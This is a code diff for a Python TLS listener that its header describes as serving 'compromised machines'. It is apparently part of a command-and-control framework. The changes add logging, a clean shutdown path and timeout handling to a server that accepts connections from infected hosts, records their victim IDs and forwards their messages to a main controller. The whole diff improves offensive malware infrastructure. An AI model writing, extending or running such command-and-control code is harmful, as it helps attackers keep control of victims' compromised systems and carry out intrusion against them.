@@ -1,14 +1,16 @@
+'''
+Description: TLS listener for compromised machines.
+Author: iss4cf0ng/ISSAC
+'''
+
 import socket
 import threading
 import json
-import time
 import ssl
 import logging
-from datetime import datetime
 
 from lib.C2P import C2P
 from lib.Client import Client
-from lib.ColorPrint import ColorPrint as cp
 from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
 from lib.Listener import Listener as mainListener
 from lib.tool import EZData, EZClass
@@ -23,12 +25,15 @@ class Listener:
 
         self.ssl_certfile = 'cert.pem'
         self.ssl_keyfile = 'key.pem'
+
+        self.log.info(f'Certificate file={self.ssl_certfile}')
+        self.log.info(f'Key file={self.ssl_keyfile}')
         
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         self.context.minimum_version = ssl.TLSVersion.TLSv1_2
         self.context.load_cert_chain(certfile=self.ssl_certfile, keyfile=self.ssl_keyfile)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) # TCP
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
         ip = '0.0.0.0' if ip == '*' else ip
@@ -38,6 +43,7 @@ class Listener:
         self.sock = sock
 
         self.bListen = sock.fileno() != -1
+        self.listening = False
 
         self.msg_handler = None
 
@@ -51,27 +57,38 @@ class Listener:
 
     def start(self):
         self.sock.listen(10000)
+        self.sock.settimeout(1)
+        self.listening = True
 
-        while True:
-            conn, addr = self.sock.accept()
-
+        while self.listening:
             try:
+                conn, addr = self.sock.accept()
                 conn = self.context.wrap_socket(conn, server_side=True)
             except ssl.SSLError as ex:
                 self.log.error(str(ex))
                 continue
+            except socket.timeout:
+                continue
+            except OSError:
+                break # socket closed
 
-            self.log.debug(f'New TLS client: ({addr[0]}, {addr[1]})')
+            self.log.info(f'New client: ({addr[0]},{addr[1]})')
 
-            t = threading.Thread(target=self.handler, args=[conn, addr])
+            t = threading.Thread(target=self.handler, args=[conn, addr, ])
             t.daemon = True
-            t.start()
 
-    def stop(self):
+            t.start()
+        
+        self.log.info('Listener thread exited.')
+
+    def stop(self) -> bool:
         try:
+            self.listening = False
             self.sock.close()
+            self.log.info(f'Stopped')
             return True
         except Exception as ex:
+            self.log.error(str(ex))
             return False
 
     def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
@@ -84,9 +101,10 @@ class Listener:
         clnt = Client(clnt_sock)
         clnt.addr = clnt_addr
         clnt.type = 'TLS'
+        self.log.info(f'{clnt.addr}: Type=> {clnt.type}')
 
         try:
-            while clnt_sock.fileno() != -1:
+            while True:
                 abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                 nRecv = len(abStaticRecv)
 
@@ -163,9 +181,12 @@ class Listener:
                                             self.dic_victim.pop(clnt_addr)
                                             clnt.VictimID = obj_json['ID']
 
-                                self.msg_handler(self.main_listener, self, lsMsg[0], clnt, lsMsg[1:])
+                                # message forwarding, pass message from victim to main listener.
+                                if self.listening:
+                                    self.msg_handler(self.main_listener, self, lsMsg[0], clnt, lsMsg[1:])
         
         except Exception as ex:
+            clnt_sock.close()
             self.log.error(str(ex))
 
         # disconnect
